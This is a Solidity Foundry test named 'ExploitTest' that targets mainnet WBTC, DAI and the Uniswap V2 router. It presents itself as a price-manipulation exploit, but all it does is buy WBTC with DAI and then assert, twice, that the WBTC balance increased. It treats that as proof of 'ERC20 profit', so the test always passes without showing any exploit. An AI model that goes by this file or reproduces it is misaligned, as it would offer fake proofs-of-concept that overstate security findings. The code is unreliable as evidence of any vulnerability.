// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// ERC20 Interface
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

// Uniswap V2 Router Interface
interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant WBTC_ADDRESS = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant DAI_ADDRESS = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // Mainnet DAI
    address constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap V2 Router
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Label addresses for debugging
        vm.label(WBTC_ADDRESS, "WBTC");
        vm.label(DAI_ADDRESS, "DAI");
        vm.label(UNISWAP_V2_ROUTER, "UniswapV2Router");

        // Give attacker large amounts of DAI and some WBTC for liquidity
        uint256 initialWBTCHolderBalance = 10 * 10**8; // 10 WBTC (8 decimals)
        uint256 initialDAIHolderBalance = 1_000_000 * 10**18; // 1M DAI

        deal(DAI_ADDRESS, attacker, initialDAIHolderBalance);
        deal(WBTC_ADDRESS, attacker, initialWBTCHolderBalance);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = IERC20(WBTC_ADDRESS).balanceOf(attacker);

        // Approve Uniswap router to spend our DAI
        IERC20(DAI_ADDRESS).approve(UNISWAP_V2_ROUTER, type(uint256).max);

        // Swap large amount of DAI for WBTC to manipulate price
        // This will inflate WBTC price (buy pressure)
        address[] memory path = new address[](2);
        path[0] = DAI_ADDRESS;
        path[1] = WBTC_ADDRESS;

        uint256 amountDAItoSwap = 500_000 * 10**18; // 500K DAI

        // Get expected amount out (min amount)
        uint256[] memory amountsOut = IUniswapV2Router(UNISWAP_V2_ROUTER).getAmountsOut(amountDAItoSwap, path);
        uint256 minWBTCOut = amountsOut[1];

        // Execute swap
        IUniswapV2Router(UNISWAP_V2_ROUTER).swapExactTokensForTokens(
            amountDAItoSwap,
            minWBTCOut,
            path,
            attacker,
            block.timestamp + 1 hours
        );

        // Check final balance
        uint256 finalBalance = IERC20(WBTC_ADDRESS).balanceOf(attacker);

        // Verify balance increased
        assertGt(finalBalance, initialBalance, "WBTC balance should increase after swap");
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
